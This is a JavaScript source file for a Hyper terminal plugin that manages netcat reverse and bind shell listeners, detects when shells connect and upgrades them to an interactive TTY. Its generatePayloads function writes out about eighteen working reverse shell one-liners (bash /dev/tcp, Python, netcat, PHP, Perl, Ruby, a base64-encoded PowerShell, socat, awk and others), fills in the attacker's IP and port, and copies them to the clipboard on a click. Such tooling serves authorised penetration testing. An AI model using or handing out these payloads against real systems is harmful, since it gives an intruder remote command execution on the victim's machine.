'use strict';

// ══════════════════════════════════════════════════════════════
//  HYPER SHELL MANAGER
//  Netcat reverse/bind shell listener management, TTY upgrade,
//  reverse shell payload generation, active shell tracking
// ══════════════════════════════════════════════════════════════

const { clipboard } = require('electron');
const { execSync } = require('child_process');

// ─── Shared Recon API ────────────────────────────────────────
function getRecon() {
  if (!window.__hyperRecon) {
    const EventEmitter = require('events');
    window.__hyperRecon = { events: new EventEmitter(), targets: new Map(), findings: [], hud: null };
    window.__hyperRecon.events.setMaxListeners(50);
  }
  return window.__hyperRecon;
}

// ─── State ───────────────────────────────────────────────────
let store = null;
let activeUid = null;

// Shell tracking: Map<uid, ShellInfo>
const shells = new Map();
// Listener tracking: Map<uid, ListenerInfo>
const listeners = new Map();
// Terminal output buffers for detection
const ptyBuffers = new Map();
// Local IP cache
let localIpCache = null;
// UI refresh callback
let hudRefresh = null;
// Default config
const config = {
  defaultPort: 4444,
  maxPort: 65535,
};

// ─── Shell Info Structure ────────────────────────────────────
// { uid, targetIp, port, type: 'reverse'|'bind', connectedAt, upgraded, status: 'listening'|'connected'|'dead' }

// ─── Helpers ─────────────────────────────────────────────────
function esc(str) {
  return "'" + str.replace(/'/g, "'\\''") + "'";
}

function sendToTerminal(uid, data) {
  if (!uid) return;
  window.rpc.emit('data', { uid: uid, data: data, escaped: false });
}

function sendToActive(data) {
  sendToTerminal(activeUid, data);
}

function getLocalIp() {
  if (localIpCache) return localIpCache;
  try {
    const result = execSync('hostname -I 2>/dev/null || ip -4 addr show scope global | grep -oP "(?<=inet )\\S+"', {
      encoding: 'utf8', timeout: 3000
    }).trim();
    const ips = result.split(/\s+/).filter(ip => /^\d+\.\d+\.\d+\.\d+$/.test(ip));
    // Prefer non-loopback, non-docker
    localIpCache = ips.find(ip => !ip.startsWith('127.') && !ip.startsWith('172.17.')) || ips[0] || '0.0.0.0';
    return localIpCache;
  } catch {
    return '0.0.0.0';
  }
}

function isPortAvailable(port) {
  try {
    execSync(`ss -tlnp 2>/dev/null | grep -q ':${port} ' && echo INUSE || echo FREE`, {
      encoding: 'utf8', timeout: 2000
    }).trim();
    const result = execSync(`ss -tlnp 2>/dev/null | grep ':${port} '`, {
      encoding: 'utf8', timeout: 2000
    }).trim();
    return result === '';
  } catch {
    // grep returns exit code 1 when no match (port is free)
    return true;
  }
}

function findNextPort(startPort) {
  let port = startPort || config.defaultPort;
  let attempts = 0;
  while (attempts < 100) {
    if (isPortAvailable(port)) return port;
    port++;
    if (port > config.maxPort) port = 1024;
    attempts++;
  }
  return startPort || config.defaultPort;
}

function formatUptime(connectedAt) {
  if (!connectedAt) return '--';
  const diff = Math.floor((Date.now() - connectedAt) / 1000);
  if (diff < 60) return `${diff}s`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ${diff % 60}s`;
  const h = Math.floor(diff / 3600);
  const m = Math.floor((diff % 3600) / 60);
  return `${h}h ${m}m`;
}

function refreshHud() {
  if (hudRefresh) hudRefresh();
}

// ─── Connection Detection Patterns ───────────────────────────
const CONNECTION_PATTERNS = [
  // Ncat/nc verbose: "connect to [1.2.3.4] from (UNKNOWN) [5.6.7.8] 54321"
  /connect to \[[\d.]+\] from .*\[(\d+\.\d+\.\d+\.\d+)\]\s+(\d+)/,
  // Ncat: "Connection from 1.2.3.4:54321"
  /Connection from (\d+\.\d+\.\d+\.\d+)[:\s]+(\d+)/i,
  // Ncat: "Connection from 1.2.3.4."
  /Connection from (\d+\.\d+\.\d+\.\d+)/i,
  // nc BSD: "Connection received on 1.2.3.4 54321"
  /Connection received on (\d+\.\d+\.\d+\.\d+)\s+(\d+)/i,
  // Generic connect
  /connect(?:ed|ion)?\s+(?:to|from)\s+(\d+\.\d+\.\d+\.\d+)/i,
];

const LISTENING_PATTERNS = [
  // nc: "listening on [any] 4444"
  /listening on .*?(\d{2,5})/i,
  // Ncat: "Listening on 0.0.0.0:4444"
  /Listening on [\d.:]+:(\d{2,5})/i,
  // Ncat: "Ncat: Listening on :::4444"
  /Listening on [:\d]+?(\d{2,5})/i,
];

function detectConnection(uid, text) {
  for (const pat of CONNECTION_PATTERNS) {
    const m = text.match(pat);
    if (m) {
      const targetIp = m[1] || 'unknown';
      const remotePort = m[2] || '?';

      // Find the listener for this uid
      const listener = listeners.get(uid);
      const listenPort = listener ? listener.port : '?';

      const shell = {
        uid,
        targetIp,
        port: listenPort,
        remotePort,
        type: listener ? listener.type : 'reverse',
        connectedAt: Date.now(),
        upgraded: false,
        status: 'connected',
      };
      shells.set(uid, shell);
      // Update listener
      if (listener) {
        listener.status = 'connected';
      }

      // Emit event to recon
      try {
        const recon = getRecon();
        recon.events.emit('shell:connected', shell);
      } catch {}

      refreshHud();
      return true;
    }
  }
  return false;
}

function detectListening(uid, text) {
  for (const pat of LISTENING_PATTERNS) {
    const m = text.match(pat);
    if (m) {
      const port = m[1];
      if (!listeners.has(uid)) {
        listeners.set(uid, {
          uid,
          port,
          type: 'reverse',
          status: 'listening',
          startedAt: Date.now(),
        });
        refreshHud();
      }
      return true;
    }
  }
  return false;
}


// ─── Shell Actions ───────────────────────────────────────────
function startListener(port, uid) {
  const targetUid = uid || activeUid;
  if (!targetUid) return;

  const usePort = port || findNextPort(config.defaultPort);

  listeners.set(targetUid, {
    uid: targetUid,
    port: usePort,
    type: 'reverse',
    status: 'listening',
    startedAt: Date.now(),
  });

  sendToTerminal(targetUid, `nc -lvnp ${usePort}\n`);
  refreshHud();
  return usePort;
}

function upgradeShell(uid) {
  const shell = shells.get(uid);
  if (!shell || shell.status !== 'connected') return;

  // Step 1: Spawn PTY
  sendToTerminal(uid, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n");

  // Step 2: After a delay, background and set raw
  setTimeout(() => {
    // Send Ctrl+Z
    sendToTerminal(uid, '\x1a');
    setTimeout(() => {
      sendToTerminal(uid, 'stty raw -echo; fg\n');
      setTimeout(() => {
        sendToTerminal(uid, 'export TERM=xterm; export SHELL=/bin/bash\n');
        shell.upgraded = true;
        refreshHud();
      }, 500);
    }, 500);
  }, 1000);
}

function killShell(uid) {
  const shell = shells.get(uid);
  // Send exit then Ctrl+C
  sendToTerminal(uid, 'exit\n');
  setTimeout(() => {
    sendToTerminal(uid, '\x03');
    if (shell) shell.status = 'dead';
    shells.delete(uid);
    listeners.delete(uid);
    refreshHud();
    try {
      const recon = getRecon();
      recon.events.emit('shell:disconnected', { uid });
    } catch {}
  }, 300);
}


// ─── Reverse Shell Payload Generator ─────────────────────────
function generatePayloads(attackerIp, port) {
  const ip = attackerIp || getLocalIp();
  const p = port || config.defaultPort;

  return {
    'Bash -i': `bash -i >& /dev/tcp/${ip}/${p} 0>&1`,

    'Bash (URL-encoded)': `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${ip}%2F${p}%200%3E%261`,

    'Python3': `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,

    'Python2': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,

    'Netcat -e': `nc ${ip} ${p} -e /bin/bash`,

    'Netcat (no -e)': `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${p} > /tmp/f`,

    'Netcat (BusyBox)': `busybox nc ${ip} ${p} -e /bin/sh`,

    'PHP': `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,

    'PHP (proc_open)': `php -r '$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open("/bin/sh",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);$sock=fsockopen("${ip}",${p});while(!feof($sock)){$cmd=fgets($sock);$out=shell_exec($cmd);fwrite($sock,$out);}'`,

    'Perl': `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,

    'Ruby': `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,

    'PowerShell': `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,

    'PowerShell (Base64)': (() => {
      const ps = `$c=New-Object System.Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
      const b64 = Buffer.from(ps, 'utf16le').toString('base64');
      return `powershell -nop -enc ${b64}`;
    })(),

    'Lua': `lua -e 'local s=require("socket");local t=assert(s.tcp());t:connect("${ip}",${p});while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;f:close();t:close();'`,

    'Java': `Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/${ip}/${p} 0>&1"}); p.waitFor();`,

    'socat': `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${p}`,

    'awk': `awk 'BEGIN {s="/inet/tcp/0/${ip}/${p}";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline) > 0) print $0 |& s;close(c)}}while(c != "exit") close(s)}}'`,
  };
}


// ══════════════════════════════════════════════════════════════
//  STYLES
// ══════════════════════════════════════════════════════════════

const COLORS = {
  bg: '#0d1117',
  bgLight: '#161b22',
  bgHover: '#1c2333',
  border: '#30363d',
  text: '#c9d1d9',
  textDim: '#8b949e',
  textBright: '#f0f6fc',
  accent: '#58a6ff',
  green: '#3fb950',
  red: '#f85149',
  orange: '#d29922',
  purple: '#bc8cff',
  cyan: '#39d353',
};

const STYLES = {
  container: {
    display: 'flex',
    flexDirection: 'column',
    height: '100%',
    background: COLORS.bg,
    color: COLORS.text,
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
    fontSize: '13px',
    overflow: 'hidden',
  },
  toolbar: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    padding: '10px 14px',
    borderBottom: `1px solid ${COLORS.border}`,
    background: COLORS.bgLight,
    flexShrink: 0,
    flexWrap: 'wrap',
  },
  btn: {
    padding: '5px 12px',
    border: `1px solid ${COLORS.border}`,
    borderRadius: '6px',
    background: COLORS.bgLight,
    color: COLORS.text,
    cursor: 'pointer',
    fontSize: '12px',
    fontWeight: 500,
    display: 'flex',
    alignItems: 'center',
    gap: '5px',
    whiteSpace: 'nowrap',
    transition: 'background 0.15s, border-color 0.15s',
  },
  btnPrimary: {
    padding: '5px 12px',
    border: `1px solid ${COLORS.green}55`,
    borderRadius: '6px',
    background: `${COLORS.green}22`,
    color: COLORS.green,
    cursor: 'pointer',
    fontSize: '12px',
    fontWeight: 600,
    display: 'flex',
    alignItems: 'center',
    gap: '5px',
    whiteSpace: 'nowrap',
    transition: 'background 0.15s',
  },
  btnDanger: {
    padding: '3px 8px',
    border: `1px solid ${COLORS.red}55`,
    borderRadius: '4px',
    background: `${COLORS.red}18`,
    color: COLORS.red,
    cursor: 'pointer',
    fontSize: '11px',
    fontWeight: 500,
    transition: 'background 0.15s',
  },
  btnSmall: {
    padding: '3px 8px',
    border: `1px solid ${COLORS.border}`,
    borderRadius: '4px',
    background: COLORS.bgLight,
    color: COLORS.text,
    cursor: 'pointer',
    fontSize: '11px',
    transition: 'background 0.15s',
  },
  input: {
    padding: '5px 10px',
    border: `1px solid ${COLORS.border}`,
    borderRadius: '6px',
    background: COLORS.bg,
    color: COLORS.text,
    fontSize: '12px',
    width: '72px',
    outline: 'none',
    fontFamily: 'monospace',
  },
  inputWide: {
    padding: '5px 10px',
    border: `1px solid ${COLORS.border}`,
    borderRadius: '6px',
    background: COLORS.bg,
    color: COLORS.text,
    fontSize: '12px',
    width: '140px',
    outline: 'none',
    fontFamily: 'monospace',
  },
  shellList: {
    flex: 1,
    overflowY: 'auto',
    padding: '8px 14px',
  },
  shellRow: {
    display: 'flex',
    alignItems: 'center',
    gap: '10px',
    padding: '8px 12px',
    marginBottom: '4px',
    borderRadius: '6px',
    background: COLORS.bgLight,
    border: `1px solid ${COLORS.border}`,
    transition: 'background 0.15s',
  },
  statusDot: (color) => ({
    width: '8px',
    height: '8px',
    borderRadius: '50%',
    background: color,
    flexShrink: 0,
    boxShadow: `0 0 6px ${color}88`,
  }),
  shellInfo: {
    flex: 1,
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    fontSize: '12px',
    fontFamily: 'monospace',
  },
  badge: (color) => ({
    padding: '1px 6px',
    borderRadius: '10px',
    fontSize: '10px',
    fontWeight: 600,
    background: `${color}22`,
    color: color,
    border: `1px solid ${color}44`,
  }),
  shellActions: {
    display: 'flex',
    gap: '6px',
    alignItems: 'center',
  },
  emptyState: {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    height: '100%',
    color: COLORS.textDim,
    gap: '8px',
  },
  // Payload generator panel
  payloadPanel: {
    borderTop: `1px solid ${COLORS.border}`,
    background: COLORS.bgLight,
    padding: '12px 14px',
    flexShrink: 0,
    maxHeight: '55%',
    overflowY: 'auto',
  },
  payloadHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: '10px',
  },
  payloadFields: {
    display: 'flex',
    gap: '8px',
    alignItems: 'center',
    marginBottom: '10px',
    flexWrap: 'wrap',
  },
  payloadItem: {
    marginBottom: '6px',
  },
  payloadLabel: {
    fontSize: '11px',
    fontWeight: 600,
    color: COLORS.accent,
    marginBottom: '3px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  payloadCode: {
    padding: '6px 10px',
    borderRadius: '4px',
    background: COLORS.bg,
    border: `1px solid ${COLORS.border}`,
    fontSize: '11px',
    fontFamily: '"SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace',
    color: COLORS.text,
    wordBreak: 'break-all',
    lineHeight: '1.5',
    cursor: 'pointer',
    position: 'relative',
    transition: 'border-color 0.15s',
    maxHeight: '80px',
    overflowY: 'auto',
  },
  selectBox: {
    padding: '5px 8px',
    border: `1px solid ${COLORS.border}`,
    borderRadius: '6px',
    background: COLORS.bg,
    color: COLORS.text,
    fontSize: '12px',
    outline: 'none',
    cursor: 'pointer',
  },
  label: {
    fontSize: '11px',
    color: COLORS.textDim,
    fontWeight: 500,
  },
  separator: {
    width: '1px',
    height: '20px',
    background: COLORS.border,
    flexShrink: 0,
  },
  copyFlash: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    background: `${COLORS.green}33`,
    borderRadius: '4px',
    color: COLORS.green,
    fontWeight: 600,
    fontSize: '11px',
    pointerEvents: 'none',
  },
};


// ══════════════════════════════════════════════════════════════
//  HUD TAB COMPONENT
// ══════════════════════════════════════════════════════════════

function createShellManagerTab(React) {
  const h = React.createElement;

  return class ShellManagerTab extends React.Component {
    constructor(props) {
      super(props);
      this.state = {
        port: String(findNextPort(config.defaultPort)),
        showPayloads: false,
        payloadIp: getLocalIp(),
        payloadPort: String(config.defaultPort),
        payloadFilter: 'all',
        copiedKey: null,
        tick: 0,
      };
      this._interval = null;
      this._refresh = this._refresh.bind(this);
    }

    componentDidMount() {
      hudRefresh = this._refresh;
      // Update uptime every second
      this._interval = setInterval(() => {
        this.setState(s => ({ tick: s.tick + 1 }));
      }, 1000);
    }

    componentWillUnmount() {
      if (hudRefresh === this._refresh) hudRefresh = null;
      if (this._interval) clearInterval(this._interval);
    }

    _refresh() {
      this.setState(s => ({ tick: s.tick + 1 }));
    }

    _copyPayload(key, text) {
      clipboard.writeText(text);
      this.setState({ copiedKey: key });
      setTimeout(() => this.setState({ copiedKey: null }), 1200);
    }

    _startListener() {
      const port = parseInt(this.state.port, 10);
      if (!port || port < 1 || port > 65535) return;
      const used = startListener(port);
      // Advance to next port for convenience
      this.setState({ port: String(findNextPort(port + 1)) });
    }

    render() {
      const { showPayloads, payloadIp, payloadPort, payloadFilter, copiedKey, port } = this.state;

      // Combine shells and listeners for display
      const allEntries = [];
      for (const [uid, listener] of listeners) {
        const shell = shells.get(uid);
        allEntries.push({
          uid,
          targetIp: shell ? shell.targetIp : '--',
          port: listener.port,
          remotePort: shell ? shell.remotePort : '--',
          type: listener.type,
          status: shell ? shell.status : listener.status,
          connectedAt: shell ? shell.connectedAt : null,
          upgraded: shell ? shell.upgraded : false,
          startedAt: listener.startedAt,
        });
      }
      // Also include shells without listeners (edge case)
      for (const [uid, shell] of shells) {
        if (!listeners.has(uid)) {
          allEntries.push({
            uid,
            targetIp: shell.targetIp,
            port: shell.port,
            remotePort: shell.remotePort,
            type: shell.type,
            status: shell.status,
            connectedAt: shell.connectedAt,
            upgraded: shell.upgraded,
            startedAt: shell.connectedAt,
          });
        }
      }

      const payloads = showPayloads ? generatePayloads(payloadIp, parseInt(payloadPort, 10) || config.defaultPort) : {};
      const payloadKeys = Object.keys(payloads);
      const filteredKeys = payloadFilter === 'all'
        ? payloadKeys
        : payloadKeys.filter(k => k.toLowerCase().includes(payloadFilter.toLowerCase()));

      return h('div', { style: STYLES.container },
        // ── Toolbar ──
        h('div', { style: STYLES.toolbar },
          // Start Listener
          h('button', {
            style: STYLES.btnPrimary,
            onClick: () => this._startListener(),
            title: 'Start netcat listener on specified port',
          },
            h('span', { style: { fontSize: '14px' } }, '\u25B6'),
            'Start Listener'
          ),
          h('div', { style: { display: 'flex', alignItems: 'center', gap: '4px' } },
            h('span', { style: STYLES.label }, 'Port:'),
            h('input', {
              style: STYLES.input,
              type: 'number',
              min: 1,
              max: 65535,
              value: port,
              onChange: (e) => this.setState({ port: e.target.value }),
              onKeyDown: (e) => { if (e.key === 'Enter') this._startListener(); },
            }),
          ),
          h('div', { style: STYLES.separator }),
          // Payload Generator Toggle
          h('button', {
            style: Object.assign({}, STYLES.btn, showPayloads ? { borderColor: COLORS.accent, color: COLORS.accent } : {}),
            onClick: () => this.setState({ showPayloads: !showPayloads }),
          },
            '\u{1F4CB}',
            showPayloads ? 'Hide Payloads' : 'Generate Payloads',
            showPayloads ? '\u25B2' : '\u25BC'
          ),
          h('div', { style: STYLES.separator }),
          // Stats
          h('span', { style: Object.assign({}, STYLES.label, { marginLeft: 'auto' }) },
            `${allEntries.filter(e => e.status === 'connected').length} connected`,
            ' | ',
            `${allEntries.filter(e => e.status === 'listening').length} listening`
          ),
        ),

        // ── Shell List ──
        h('div', { style: STYLES.shellList },
          allEntries.length === 0
            ? h('div', { style: STYLES.emptyState },
                h('span', { style: { fontSize: '32px', opacity: 0.3 } }, '\u{1F41A}'),
                h('span', { style: { fontSize: '14px' } }, 'No active shells'),
                h('span', { style: { fontSize: '11px' } }, 'Start a listener to begin catching shells'),
              )
            : allEntries.map((entry, idx) => {
                const statusColor = entry.status === 'connected' ? COLORS.green
                  : entry.status === 'listening' ? COLORS.orange
                  : COLORS.red;
                const statusLabel = entry.status === 'connected' ? 'CONNECTED'
                  : entry.status === 'listening' ? 'LISTENING'
                  : 'DEAD';

                return h('div', {
                  key: entry.uid || idx,
                  style: STYLES.shellRow,
                  onMouseEnter: (e) => { e.currentTarget.style.background = COLORS.bgHover; },
                  onMouseLeave: (e) => { e.currentTarget.style.background = COLORS.bgLight; },
                },
                  // Status dot
                  h('div', { style: STYLES.statusDot(statusColor) }),
                  // Info
                  h('div', { style: STYLES.shellInfo },
                    h('span', { style: { color: COLORS.textBright, fontWeight: 600 } }, entry.targetIp),
                    h('span', { style: { color: COLORS.textDim } }, '|'),
                    h('span', null, `port ${entry.port}`),
                    h('span', { style: { color: COLORS.textDim } }, '|'),
                    h('span', { style: STYLES.badge(statusColor) }, statusLabel),
                    h('span', { style: { color: COLORS.textDim } }, '|'),
                    h('span', { style: STYLES.badge(COLORS.purple) }, entry.type),
                    entry.connectedAt && h('span', { style: { color: COLORS.textDim, fontSize: '11px' } },
                      '| ', formatUptime(entry.connectedAt)
                    ),
                    entry.upgraded && h('span', { style: STYLES.badge(COLORS.cyan) }, 'TTY'),
                  ),
                  // Actions
                  h('div', { style: STYLES.shellActions },
                    entry.status === 'connected' && !entry.upgraded && h('button', {
                      style: Object.assign({}, STYLES.btnSmall, { borderColor: `${COLORS.cyan}55`, color: COLORS.cyan }),
                      onClick: () => upgradeShell(entry.uid),
                      title: 'Upgrade to interactive TTY',
                    }, '\u2191 TTY'),
                    h('button', {
                      style: STYLES.btnDanger,
                      onClick: () => killShell(entry.uid),
                      title: 'Kill this shell/listener',
                    }, '\u2715 Kill'),
                  ),
                );
              })
        ),

        // ── Payload Generator Panel ──
        showPayloads && h('div', { style: STYLES.payloadPanel },
          h('div', { style: STYLES.payloadHeader },
            h('span', { style: { fontWeight: 600, color: COLORS.textBright, fontSize: '13px' } }, 'Reverse Shell Generator'),
            h('span', { style: { fontSize: '11px', color: COLORS.textDim } }, 'Click any payload to copy'),
          ),
          h('div', { style: STYLES.payloadFields },
            h('div', { style: { display: 'flex', alignItems: 'center', gap: '4px' } },
              h('span', { style: STYLES.label }, 'LHOST:'),
              h('input', {
                style: STYLES.inputWide,
                value: payloadIp,
                onChange: (e) => this.setState({ payloadIp: e.target.value }),
                placeholder: '0.0.0.0',
              }),
            ),
            h('div', { style: { display: 'flex', alignItems: 'center', gap: '4px' } },
              h('span', { style: STYLES.label }, 'LPORT:'),
              h('input', {
                style: STYLES.input,
                type: 'number',
                value: payloadPort,
                onChange: (e) => this.setState({ payloadPort: e.target.value }),
              }),
            ),
            h('div', { style: { display: 'flex', alignItems: 'center', gap: '4px' } },
              h('span', { style: STYLES.label }, 'Filter:'),
              h('select', {
                style: STYLES.selectBox,
                value: payloadFilter,
                onChange: (e) => this.setState({ payloadFilter: e.target.value }),
              },
                h('option', { value: 'all' }, 'All'),
                h('option', { value: 'bash' }, 'Bash'),
                h('option', { value: 'python' }, 'Python'),
                h('option', { value: 'netcat' }, 'Netcat'),
                h('option', { value: 'php' }, 'PHP'),
                h('option', { value: 'perl' }, 'Perl'),
                h('option', { value: 'ruby' }, 'Ruby'),
                h('option', { value: 'powershell' }, 'PowerShell'),
                h('option', { value: 'lua' }, 'Lua'),
                h('option', { value: 'java' }, 'Java'),
                h('option', { value: 'socat' }, 'socat'),
                h('option', { value: 'awk' }, 'awk'),
              ),
            ),
            h('button', {
              style: Object.assign({}, STYLES.btnSmall, { color: COLORS.accent }),
              onClick: () => {
                localIpCache = null;
                this.setState({ payloadIp: getLocalIp() });
              },
              title: 'Refresh local IP',
            }, '\u21BB Detect IP'),
          ),
          // Payload list
          filteredKeys.map(key =>
            h('div', { key, style: STYLES.payloadItem },
              h('div', { style: STYLES.payloadLabel },
                h('span', null, key),
                h('button', {
                  style: Object.assign({}, STYLES.btnSmall, {
                    fontSize: '10px',
                    padding: '1px 6px',
                    color: copiedKey === key ? COLORS.green : COLORS.textDim,
                  }),
                  onClick: () => this._copyPayload(key, payloads[key]),
                }, copiedKey === key ? '\u2713 Copied' : 'Copy'),
              ),
              h('div', {
                style: STYLES.payloadCode,
                onClick: () => this._copyPayload(key, payloads[key]),
                title: 'Click to copy',
              },
                payloads[key],
                copiedKey === key && h('div', { style: STYLES.copyFlash }, '\u2713 Copied to clipboard'),
              ),
            )
          ),
        ),
      );
    }
  };
}


// ══════════════════════════════════════════════════════════════
//  PLUGIN EXPORTS
// ══════════════════════════════════════════════════════════════

// ─── Middleware: Track sessions & detect shell connections ────
exports.middleware = (s) => {
  store = s;
  return (next) => (action) => {
    switch (action.type) {
      case 'SESSION_SET_ACTIVE':
        activeUid = action.uid;
        break;

      case 'SESSION_ADD':
        if (!activeUid) activeUid = action.uid;
        break;

      case 'SESSION_PTY_EXIT':
      case 'SESSION_USER_EXIT':
        if (action.uid === activeUid) activeUid = null;
        // Mark shell as dead
        if (shells.has(action.uid)) {
          shells.get(action.uid).status = 'dead';
          shells.delete(action.uid);
          listeners.delete(action.uid);
          refreshHud();
          try {
            const recon = getRecon();
            recon.events.emit('shell:disconnected', { uid: action.uid });
          } catch {}
        }
        break;

      case 'SESSION_PTY_DATA': {
        const uid = action.uid;
        const data = typeof action.data === 'string' ? action.data : '';
        if (data.length > 0 && data.length < 4096) {
          // Accumulate buffer for multi-chunk messages
          const prev = ptyBuffers.get(uid) || '';
          const combined = (prev + data).slice(-2048); // keep last 2KB
          ptyBuffers.set(uid, combined);

          // Check lines for patterns
          const lines = data.split(/\r?\n/);
          for (const line of lines) {
            if (line.trim().length < 5) continue;
            // Try connection detection first (more important)
            if (!shells.has(uid) || shells.get(uid).status !== 'connected') {
              if (detectConnection(uid, line)) break;
            }
            // Try listening detection
            if (!listeners.has(uid)) {
              detectListening(uid, line);
            }
          }
        }
        break;
      }
    }

    return next(action);
  };
};


// ─── Register HUD Tab ────────────────────────────────────────
exports.decorateTerm = (Term, { React }) => {
  const ShellManagerTab = createShellManagerTab(React);

  return class ShellManagerTerm extends React.Component {
    constructor(props) {
      super(props);
      this._registered = false;
    }

    componentDidMount() {
      this._registerHudTab(React);
    }

    componentDidUpdate() {
      this._registerHudTab(React);
    }

    _registerHudTab(React) {
      if (this._registered) return;
      try {
        const recon = getRecon();
        if (recon.hud && typeof recon.hud.registerTab === 'function') {
          recon.hud.registerTab('shells', 'Shells', (props) => React.createElement(ShellManagerTab, props));
          this._registered = true;
        }
      } catch {}
    }

    render() {
      return React.createElement(Term, Object.assign({}, this.props));
    }
  };
};


// ─── Keymaps ─────────────────────────────────────────────────
exports.decorateKeymaps = (keymaps) => {
  return Object.assign({}, keymaps, {
    'shell:startListener': 'ctrl+shift+l',
  });
};

exports.reduceUI = (state, action) => {
  switch (action.type) {
    case 'shell:startListener': {
      const port = findNextPort(config.defaultPort);
      startListener(port);
      break;
    }
  }
  return state;
};

exports.mapTermsDispatch = (dispatch, map) => {
  return Object.assign({}, map, {
    'shell:startListener': () => {
      const port = findNextPort(config.defaultPort);
      startListener(port);
    },
  });
};
